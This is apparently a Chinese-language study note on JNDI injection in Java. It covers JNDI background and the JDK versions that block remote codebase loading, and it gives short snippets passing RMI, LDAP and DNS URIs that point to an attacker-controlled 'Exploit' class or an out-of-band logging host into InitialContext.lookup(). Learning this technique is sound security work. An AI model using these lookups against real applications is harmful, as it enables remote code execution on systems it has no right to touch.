# 2-邂逅各种注入

**邂逅 —— 「雨伞倾斜的第二次偶然」**

## 1. jndi注入

示例代码见 https://github.com/Rain1er/security_db/tree/main/Java_relevant/code/jndi

### 1.1 背景知识

> The **Java Naming and Directory Interface** (**JNDI**) is a Java [API](https://en.wikipedia.org/wiki/Application_programming_interface) for a [directory service](https://en.wikipedia.org/wiki/Directory_service) that allows Java software clients to discover and look up data and resources (in the form of Java [objects](https://en.wikipedia.org/wiki/Object_(computer_science))) via a name. Like all [Java](https://en.wikipedia.org/wiki/Java_(programming_language)) APIs that interface with host systems, JNDI is independent of the underlying implementation.

简单来说，JNDI 就像Java里的“电话簿”，让你可以通过名字找到各种资源（如Java对象、数据库、EJB、消息队列等）和各种目录服务如LDAP、DNS、RMI Registry等），无论它们是在本地还是远程服务器上。

这里主要记录LADP、RMI、DNS 协议的攻击。

* **版本限制** 

JDK 6u141、7u131、8u121之后：增加了`com.sun.jndi.rmi.object.trustURLCodebase`选项，默认为`false`，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。

JDK 6u211、7u201、8u191之后：增加了`com.sun.jndi.ldap.object.trustURLCodebase`选项，默认为`false`，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。

<img src="https://cdn.jsdelivr.net/gh/Rain1er/images@main/img/20200419225882.png" alt="image.png" style="zoom:50%;" />



## 1.2 利用手法

> 当开发者在定义 JNDI 接口初始化时，lookup() 方法的参数可控，攻击者就可以将恶意的 url 传入参数远程加载恶意载荷，造成注入攻击。

最初公开于BlackHat 2016（USA）

https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf



### 1.2.1 利用RMI协议注入

> `Remote Method Invocation` JAVA 远程方法协议，该协议用于远程调用应用程序编程接口，使客户机上运行的程序可以调用远程服务器上的对象

```java
String uri = "rmi://127.0.0.1:1099/Exploit";    // 指定查找的对象,传入攻击者可控的RMIServer,其中包含恶意类
InitialContext initialContext = new InitialContext();// 得到初始目录环境的一个引用
initialContext.lookup(uri); // 获取指定的远程对象
```



### 1.2.2 利用LDAP协议注入

>  `Lightweight Directory Access Protocol` 轻量级目录访问协议，约定了 Client 与 Server 之间的信息交互格式、使用的端口号、认证方式等内容

```java
InitialContext initialContext = new InitialContext();
initialContext.lookup("ldap://127.0.0.1:7777/Exp");
```



### 1.2.3 利用DNS协议注入

```java
InitialContext initialContext = new InitialContext();
initialContext.lookup("dns://c17208f0.log.cdncache.rr.nu.");    // 关闭clash的tun模式
```





## 1.3 原理分析 & 高版本的绕过

todo

